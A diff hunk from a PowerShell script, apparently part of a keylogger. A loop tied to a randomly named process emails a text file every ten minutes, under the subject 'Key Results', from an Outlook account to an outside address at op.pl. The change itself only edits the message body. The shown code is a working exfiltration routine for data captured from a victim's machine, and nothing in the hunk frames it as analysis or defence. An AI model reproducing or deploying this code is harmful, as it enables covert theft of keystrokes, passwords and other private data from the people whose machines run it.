@@ -7,7 +7,7 @@ while (Get-Process -Name "ygoLa8SyqmQTGsoh" -ErrorAction SilentlyContinue)
     $From = "jankowalski69zs@outlook.com"
     $To = "resultsiliketowatch@op.pl"
     $Subject = "Key Results"
-    $Body = "Lets see..."
+    $Body = "File send: 0x00"
     $Attachment = ".\nmaqncdCwP.txt"
     Send-MailMessage -SmtpServer "smtp-mail.outlook.com" -UseSsl -Port 587 -Credential $Credential -From $From -To $To -Subject $Subject -Body $Body -Attachments $Attachment
     Start-Sleep -Seconds 600
